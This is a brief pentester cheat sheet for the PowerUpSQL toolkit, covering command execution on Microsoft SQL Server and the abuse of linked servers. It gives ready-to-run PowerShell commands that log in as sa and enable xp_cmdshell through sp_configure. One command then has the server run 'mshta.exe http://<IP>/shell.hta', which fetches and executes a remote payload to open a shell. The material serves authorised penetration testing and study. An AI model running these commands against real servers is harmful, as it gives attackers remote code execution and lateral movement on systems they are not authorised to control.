# PowerUpSQL

## 01 - Invoke-SQLOSCmd

Note: `<FQDN_domain>` is literally `<IP>.<domain>`.

```
PS C:\> impo .\PowerUpSQL.ps1

PS C:\> Invoke-SQLOSCmd -Instance "<FQDN_domain>,1433" -Command "<command>" -RawResults
```

## 02 - Get-SQLServerLinkCrawl

```
PS C:\> Get-SQLServerLink -Username sa -Password <password> -Instance <domain>\<IP> -Verbose

PS C:\> Get-SQLServerLink -Username sa -Password <password> -Instance <domain>\<IP> -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;')"

PS C:\> Get-SQLServerLink -Username sa -Password <password> -Instance <domain>\<IP> -Query "exec master..xp_cmdshell 'mshta.exe http://<IP>/shell.hta'"
```

---
## References

- [MSSQL for Pentester Abusing Linked Database](https://www.hackingarticles.in/mssql-for-pentester-abusing-linked-database/)

- [NetSPI: SQL Server Link Crawling PowerUpSQL](https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-link-crawling-powerupsql/)

- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)